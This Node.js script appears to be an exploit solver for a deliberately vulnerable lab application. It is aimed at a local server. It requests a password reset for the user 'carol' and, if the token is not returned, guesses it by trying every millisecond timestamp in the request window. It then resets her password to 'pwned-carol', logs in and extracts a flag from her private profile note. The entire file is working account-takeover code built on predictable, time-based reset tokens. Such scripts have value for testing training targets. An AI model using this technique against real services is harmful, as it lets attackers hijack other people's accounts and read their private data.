#!/usr/bin/env node
/** V2.5 Predictable reset token → carol private_note flag */
import { extractFlag } from '../../../packages/shared/dist/index.js';

process.on('unhandledRejection', (e) => {
  console.error('FAIL:', e instanceof Error ? e.message : e);
  process.exit(1);
});

function arg(name, fallback) {
  const i = process.argv.indexOf(`--${name}`);
  return i >= 0 ? process.argv[i + 1] : fallback;
}

const base = arg('base', 'http://127.0.0.1:3011').replace(/\/$/, '');

const before = Date.now();
const reqReset = await fetch(`${base}/api/reset/request`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'carol' }),
}).then((r) => r.json());
const after = Date.now();

let token = reqReset.resetToken;
if (!token) {
  // Predict Date.now()-based token window if not echoed
  for (let t = before; t <= after + 5; t++) {
    const tryConfirm = await fetch(`${base}/api/reset/confirm`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: String(t), newPassword: 'pwned-carol' }),
    });
    if (tryConfirm.ok) {
      token = String(t);
      break;
    }
  }
} else {
  const confirm = await fetch(`${base}/api/reset/confirm`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token, newPassword: 'pwned-carol' }),
  });
  if (!confirm.ok) {
    console.error('FAIL: confirm', await confirm.text());
    process.exit(1);
  }
}

if (!token) {
  console.error('FAIL: could not obtain/predict reset token');
  process.exit(1);
}

const login = await fetch(`${base}/api/login`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'carol', password: 'pwned-carol' }),
}).then((r) => r.json());

if (!login.token) {
  console.error('FAIL: login after reset', login);
  process.exit(1);
}

const profile = await fetch(`${base}/api/profile`, {
  headers: { Authorization: `Bearer ${login.token}` },
}).then((r) => r.text());

const flag = extractFlag(profile);
if (!flag) {
  console.error('FAIL: no flag in private_note', profile);
  process.exit(1);
}
console.log('FLAG', flag);
console.log('PASS V2.5 crypto-reset');
